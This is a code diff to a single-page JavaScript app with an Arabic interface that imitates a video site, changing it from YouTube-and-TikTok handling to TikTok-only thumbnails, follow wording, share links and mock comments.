-  let ytLinkText = v.platform === 'tiktok' ? 'الفيديو لا يعمل؟ شاهده على تيك توك ↗' : 'الفيديو لا يعمل؟ شاهده على يوتيوب ↗';
-
-  $('#view').innerHTML=`<div class="watch"><div class="w-primary">
+  $('#view').innerHTML = `<div class="watch"><div class="w-primary">
     <div class="player">${playerHtml}</div>
-    <div class="yt-link-wrap"><a class="yt-link" href="${linkOf(v)}" target="_blank" rel="noopener">${ytLinkText}</a></div>
+    <div class="yt-link-wrap"><a class="yt-link" href="${linkOf(v)}" target="_blank" rel="noopener">الفيديو لا يعمل؟ شاهده على تطبيق تيك توك الرسمي ↗</a></div>
     <div id="wMeta"></div>
     <div id="wComments">
       <h2 class="cm-title" id="cmCount"></h2>
       <div class="cm-form">${avatar('أنت',40)}<div class="cm-box" id="cmBox"><input id="cmInput" type="text" placeholder="أضف تعليقاً..." autocomplete="off"><div class="cm-btns"><button class="btn ghost" data-action="cm-cancel">إلغاء</button><button class="btn btn-sub" id="cmSend" data-action="cm-send" disabled>تعليق</button></div></div></div>
       <div id="cmList"></div>
     </div></div>
-    <aside class="w-secondary"><h3 class="rel-title">فيديوهات مقترحة</h3>${rel.map(x=>{
-        let tUrl = x.platform === 'tiktok' ? `https://www.tiktok.com/api/img/?itemId=${x.id}&location=0` : `https://img.youtube.com/vi/${x.id}/hqdefault.jpg`;
-        return `<div class="rel" data-open="${x.id}"><div class="thumb"><img loading="lazy" src="${tUrl}" alt="" onerror="this.style.display='none'"><span class="dur">${x.dur}</span></div><div><h4 class="t">${x.title}</h4><div class="sub">${x.ch}</div><div class="sub">${fmt(x.views)} مشاهدة • ${x.time}</div></div></div>`;
+    <aside class="w-secondary"><h3 class="rel-title">مقاطع مقترحة</h3>${rel.map(x=>{
+        let tUrl = `https://www.tiktok.com/api/img/?itemId=${x.id}&location=0`;
+        return `<div class="rel" data-open="${x.id}"><div class="thumb"><img loading="lazy" src="${tUrl}" alt="" onerror="this.style.display='none'"><span class="dur">${x.dur}</span></div><div><h4 class="t">${x.title}</h4><div class="sub">@${x.ch}</div><div class="sub">${fmt(x.views)} مشاهدة • ${x.time}</div></div></div>`;
     }).join('')}</aside></div>`;
-  refreshMeta();refreshComments();
+  refreshMeta();
+  refreshComments();
 }
 
 function refreshMeta(){
   const v=cur(),liked=S.liked.has(v.id),dis=S.disliked.has(v.id),sub=S.subs.has(v.ch),saved=S.saved.has(v.id),dl=S.dl.has(v.id);
   $('#wMeta').innerHTML=`<h1 class="w-title">${v.title}</h1>
   <div class="w-row">
-    <div class="ch">${avatar(v.ch,40)}<div><div class="ch-name">${v.ch}</div><div class="sub">${fmt(CH[v.ch].subs+(sub?1:0))} مشترك</div></div>
-      <button class="btn btn-sub ${sub?'on':''}" data-action="subscribe">${sub?ic('bell','sm')+'مشترك':'اشتراك'}</button></div>
+    <div class="ch">${avatar(v.ch,40)}<div><div class="ch-name">@${v.ch}</div><div class="sub">${fmt(CH[v.ch].subs+(sub?1:0))} متابع</div></div>
+      <button class="btn btn-sub ${sub?'on':''}" data-action="subscribe">${sub?'مُتابع':'متابعة'}</button></div>
     <div class="actions">
       <div class="seg"><button class="${liked?'on':''}" data-action="like" title="إعجاب" aria-label="إعجاب">${ic('like')}<span>${fmt(v.likes+(liked?1:0))}</span></button><span class="sep"></span><button class="${dis?'on':''}" data-action="dislike" title="عدم إعجاب" aria-label="عدم إعجاب">${ic('dislike')}</button></div>
       <button class="btn" data-action="share">${ic('share')}مشاركة</button>
@@ -600,12 +586,11 @@ function refreshMeta(){
     </div></div>
   <div class="desc ${S.descOpen?'open':''}" data-action="desc"><b>${fmt(v.views)} مشاهدة • ${v.time}</b><p>${v.desc}</p><span class="more">${S.descOpen?'عرض أقل':'...المزيد'}</span></div>`;
 }
+
 function getComments(id){
   if(!S.comments[id])S.comments[id]=[
-    {id:1,u:'أحمد علي',t:'منذ يومين',txt:'فيديو رائع! شكراً على المحتوى المميز 👏',l:124},
-    {id:2,u:'سارة محمد',t:'منذ ٣ أيام',txt:'من أفضل ما شاهدت اليوم، استمروا.',l:57},
-    {id:3,u:'خالد العتيبي',t:'منذ أسبوع',txt:'شاهدته أكثر من مرة ولا زلت أستمتع به 😍',l:32},
-    {id:4,u:'ليلى حسن',t:'منذ أسبوعين',txt:'يستحق أضعاف هذه المشاهدات 🔥',l:9}
+    {id:1,u:'أحمد علي',t:'منذ يومين',txt:'فيديو رائع جداً 🔥',l:124},
+    {id:2,u:'سارة محمد',t:'منذ ٣ أيام',txt:'هههه يجنن! 😍',l:57}
   ];
   return S.comments[id];
 }
@@ -624,7 +609,6 @@ function sendComment(){
   refreshComments();toast('تمت إضافة تعليقك');
 }
 
-/* ===== Share / copy / download ===== */
 async function copyText(t){
   try{await navigator.clipboard.writeText(t);return true}catch(e){
     try{const ta=document.createElement('textarea');ta.value=t;ta.style.cssText='position:fixed;opacity:0';document.body.appendChild(ta);ta.select();const ok=document.execCommand('copy');ta.remove();return ok}catch(_){return false}
@@ -636,7 +620,7 @@ async function copyLink(){
 }
 function openShare(){
   const v=cur(),url=linkOf(v),u=encodeURIComponent(url),t=encodeURIComponent(v.title);
-  const P=[['واتساب','#25d366','W',`https://wa.me/?text=${t}%20${u}`],['تيليجرام','#229ed9','T',`https://t.me/share/url?url=${u}&text=${t}`],['X','#000','X',`https://twitter.com/intent/tweet?url=${u}&text=${t}`],['فيسبوك','#1877f2','f',`https://www.facebook.com/sharer/sharer.php?u=${u}`],['البريد','#666','@',`mailto:?subject=${t}&body=${u}`]];
+  const P=[['واتساب','#25d366','W',`https://wa.me/?text=${t}%20${u}`],['تيليجرام','#229ed9','T',`https://t.me/share/url?url=${u}&text=${t}`],['X','#000','X',`https://twitter.com/intent/tweet?url=${u}&text=${t}`],['فيسبوك','#1877f2','f',`https://www.facebook.com/sharer/sharer.php?u=${u}`]];
   $('#shareRow').innerHTML=P.map(([n,c,l,h])=>`<a href="${h}" target="_blank" rel="noopener"><i style="background:${c}">${l}</i>${n}</a>`).join('');
   $('#shareLink').value=url;$('#modal').classList.add('show');
   copyLink();
@@ -658,7 +642,6 @@ function download(){
   },300);
 }
 
-/* ===== Actions ===== */
 function act(a,el){
   const v=S.cur?cur():null;
   switch(a){
@@ -670,7 +653,7 @@ function act(a,el){
     case 'profile':toast('مرحباً بك 👋');break;
     case 'subscribe':{
       const on=!S.subs.has(v.ch);on?S.subs.add(v.ch):S.subs.delete(v.ch);
-      refreshMeta();renderSidebar();toast(on?`تم الاشتراك في قناة ${v.ch}`:'تم إلغاء الاشتراك');break}
+      refreshMeta();renderSidebar();toast(on?`تمت متابعة @${v.ch}`:'تمت إلغاء المتابعة');break}
     case 'like':S.liked.has(v.id)?S.liked.delete(v.id):(S.liked.add(v.id),S.disliked.delete(v.id));refreshMeta();break;
     case 'dislike':S.disliked.has(v.id)?S.disliked.delete(v.id):(S.disliked.add(v.id),S.liked.delete(v.id));refreshMeta();break;
     case 'share':openShare();break;
@@ -715,7 +698,6 @@ $('#searchForm').addEventListener('submit',e=>{ e.preventDefault();const t=$('#q
   searchFor(t);$('#q').blur();
 });
 
-/* ===== التعامل مع أزرار المتصفح ===== */
 window.addEventListener('popstate',e=>{
   if(e.state){
     S.view=e.state.view;
@@ -732,7 +714,6 @@ window.addEventListener('popstate',e=>{
   scrollTo(0,0);
 });
 
-/* ===== تهيئة الأيقونات وتشغيل التطبيق ===== */
 document.querySelectorAll('[data-ic]').forEach(el=>el.innerHTML=ic(el.dataset.ic));
 render(true);
 </script>
